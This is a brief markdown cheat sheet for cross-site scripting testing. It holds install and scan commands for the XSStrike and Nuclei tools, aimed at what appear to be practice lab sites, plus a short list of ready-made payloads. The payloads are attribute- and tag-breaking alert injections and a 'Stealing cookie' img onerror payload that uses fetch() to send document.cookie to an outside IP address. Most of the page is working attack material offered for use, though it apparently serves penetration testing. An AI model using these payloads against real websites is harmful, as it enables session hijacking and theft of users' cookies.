---
description: Cross-site scripting (XSS) cheat sheet
---

# Cross-site scripting (XSS)

### Tools

XSStrike - [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)

{% code overflow="wrap" %}
```bash
# Install
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
python3 -m venv xsstrike_env
source xsstrike_env/bin/activate
pip3 install -r requirements.txt

# run
python3 xsstrike.py -u https://www.codelatte.id/labs/xss/1.php?q= --fuzzer
python3 xsstrike.py -u https://www.codelatte.id/labs/xss/1.php --crawl -l 4
```
{% endcode %}

Nuclei

{% code overflow="wrap" %}
```bash
nuclei -u http://testphp.vulnweb.com/ -tags xss
```
{% endcode %}

### Simple Payload

This is a simple payload that I commonly use for XSS testing.

Inside HTML Tag

{% code overflow="wrap" %}
```javascript
" autofocus onfocus=alert(document.domain) x="
```
{% endcode %}

Breaking Tag

{% code overflow="wrap" %}
```javascript
"/><img src=x onerror=alert(document.domain) />
```
{% endcode %}

Stealing cookie

{% code overflow="wrap" %}
```javascript
<img src="x" onerror="fetch('http://10.10.1.3:8000?c=' + encodeURIComponent(document.cookie))">
```
{% endcode %}

### Resources

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
* [https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/xss.txt](https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/xss.txt)
